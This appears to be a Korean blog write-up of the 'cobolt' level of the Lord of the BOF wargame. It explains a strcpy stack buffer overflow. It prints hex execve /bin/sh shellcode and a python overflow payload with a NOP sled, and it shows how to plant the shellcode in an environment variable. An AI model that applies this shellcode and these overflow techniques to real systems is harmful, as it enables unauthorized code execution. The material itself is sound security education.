---
title: "[LOB]Level02. cobolt"
tags: [Wargame, LOB, Write-up]
author: eli_ez3r
key: 20180828
modify_date: 2019-10-07
article_header:
  type: cover
  image:
    src: 
---
[+ Small Buffer](#){:.button.button--outline-success.button--pill}

### 0x01. Static Analysis

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - cobolt
        - small buffer
*/

int main(int argc, char *argv[])
{
    char buffer[16];
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
}
```

cobolt의 소스코드를 살펴보자.

앞서 gremlin과 동일하게

argv[1]의 값을 buffer배열로 복사할때 복사되는 크기가 정해져있지 않아 BoF(Buffer OverFlow) 취약점이 존재한다.
{:.info}

하지만 다른점은 **buffer배열의 크기가 16바이트**라는 점이다. **앞서 사용한 shellcode는 24바이트이기 때문에 해당 shellcode를 buffer배열에 넣지 못한다.**

이런 경우 shellcode를 넣을 수 있는 방법은 여러가지가 있다.

1.  ret주소 이후 스택공간에 shellcode를 넣는 방법
2. 환경변수 부분에 shellcode를 넣는 방법
3. argv[2] 인자에 shellcode를 넣는 방법 등...

등등.. 방법은 연구하기 나름이다. 



필자는 1, 2번 방법으로 문제를 풀어 볼 것이다.

------

### 0x02. Dyamic Analysis & Exploit



#### 1) RET 아래 스택 영역 사용하기.

```
shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827223605161.png" width="500px">

위 그림처럼 buffer배열과 SFP는 쓰레기값을 넣고, RET에는 RET바로 다음 주소를 가리키게 하고 그 뒤로 shellcode를 넣는다.

shellcode가 들어가는 주소를 알기 위해 core dump를 만들자.



<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827225219317.png" width="700px">

```
./aobolt `python -c 'print "A"*16+"BBBB"+"CCCC"+"\x90"*50+"S"*24'`
```

> BBBB는 SFP, CCCC는 RET, '\x90'은 NOP슬라이드, S는 쉘코드가 들어갈 공간(24byte)



<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827225429938.png" width="700px">

core dump를 살펴보면 우리가 **shellcode를 넣을 공간은 "S"(\x53)가 들어간 공간**이다. NOP를 넣은 이유는 NOP Sliding을 이용하여 쉽게 shellcode에 접근하기 위함으로 NOP(\x90)이 있는 주소 아무곳을 RET주소에 넣으면 NOP를 따라 내려가다가 shellcode를 만나 실행하게 된다.

RET주소에 대략 0xbffffa6c주소 언저리를 넣어주면 될 것 같다.



<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827225615182.png" width="700px">



-----

#### 2) 환경변수 사용하기.

linux 시스템에는 환경변수라는 것이 존재한다. `export` 명령어를 치면 환경변수들이 나타나게 되는데, 이러한 변수들이 프로그램이 동작할 때 마다 스택에 쌓여 하나의 변수처럼 사용되게 된다.

<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827225742065.png" width="700px">



실제 프로그램이 실행되면 스택 어느 부분에 쌓이게 되는지 알아보자.

<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827230447465.png" width="700px">

cobolt를 복사한 abolt 파일을 기준으로 ebp+281부분부터 보게되면 환경변수들이 스택에 쌓여 있는 것을 볼 수 있다.

ebp+281이라는 것은 **환경변수가 먼저 스택에 쌓이고 프로그램이 실행된다**는 것을 알 수 있다.

따라서 우리는 이 부분에 shellcode를 올리고, RET에 환경변수 주소를 넣어 shellcode가 실행되도록 해보자.



<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827230946829.png" width="700px">

환경변수를 추가하는 방법은 `export [변수명]="변수 값"` 명령어를 이용하여 추가 할 수 있다.

위 사진처럼 EUNICE라는 환경변수를 추가하였으며, 다시 프로그램을 실행하여 정상적으로 스택에 쌓이지는 확인해보자.



<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827231211347.png" width="700px">

환경변수가 추가되어 스택의 주소가 약간 변동이 있지만, 정상적으로 EUNICE 환경변수가 스택에 들어가 있음을 알 수 있다.



이제 환경변수가 스택에 쌓이고 프로그램이 실행된다는 개념을 알았으므로 이를 이용하여 exploit을 해보자.



먼저 환경변수에 쉘코드를 넣어보자.

<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827231441368.png" width="700px">

NOP 50byte와 shellcode를 EUNICE 라는 환경변수에 넣었다.



이제 남은것은 해당 환경변수의 주소를 구하는 것이다. 위에 처럼 gdb로 직접 스택의 주소를 확인 하는 방법이 있지만 API를 이용하면 보다 쉽게 주소를 구할 수 있다.

```c
main(){
    printf("addr : %08x\n", getenv("EUNICE"));
}
```

<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827231752514.png" width="400px">

EUNICE 환경 변수의 주소는 **0xbffffc21**이다. (쉽죠잉?😁)

이제 이 주소를 RET에 넣으면 끄읏...

<img src="http://eliez3r.synology.me/assets/img/writeup/lob/02.cobolt/image-20180827231937161.png" width="800px">

-----

### 0x03. 정리

cobolt 문제는 buffer배열의 크기가 작아 배열 내에 shellcode를 넣는 것이 불가능 했다. 따라서 buffer배열이 아닌 또 다른 스택 영역에 공간에 shellcode를 넣어 실행하였으며 그 스택 공간은 main함수의 RET 이후 스택 영역과 환경변수 영역을 이용하였다. 이 외에도 실행가능한 스택영역 어디든 프로그램이 동작하는데에 영향을 주지 않는 곳이라면 모두 가능하다.

-----

